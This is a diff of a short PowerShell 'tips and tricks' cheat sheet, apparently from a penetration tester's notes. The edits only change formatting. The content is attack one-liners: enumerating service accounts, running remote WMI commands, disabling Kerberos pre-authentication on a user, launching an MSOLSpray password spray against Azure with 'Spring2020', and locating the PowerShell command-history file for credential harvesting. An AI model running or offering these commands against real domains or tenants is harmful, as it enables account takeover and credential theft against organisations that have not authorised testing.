@@ -1,4 +1,4 @@
-####PowerShell Tips and Tricks
+PowerShell Tips and Tricks
 
 List all services that do not run as a standard account----Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\* | Where-Object {($_.ObjectName -notlike 'NT Authority\*') -and ($_.ObjectName -ne $null) -and ($_.ObjectName -ne "LocalSystem")}
 
@@ -14,7 +14,7 @@ Run a Remote Command----Get-WMIObject –ComputerName remotehost –query "Selec
 
 Disable Kerberos PreAuth----Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
 
-Import a Module----Import-Module .\MSOLSpray.ps1; 
+Import a Module----Import-Module -Name .\MSOLSpray.ps1; 
 Azure Password Spray----Invoke-MSOLSpray -Userlist ./users.txt -Password "Spring2020"
 
 PowerShell Command History File----% AppData Roaming Microsoft Windows PowerShell PSReadLine ConsoleHost_history.txt
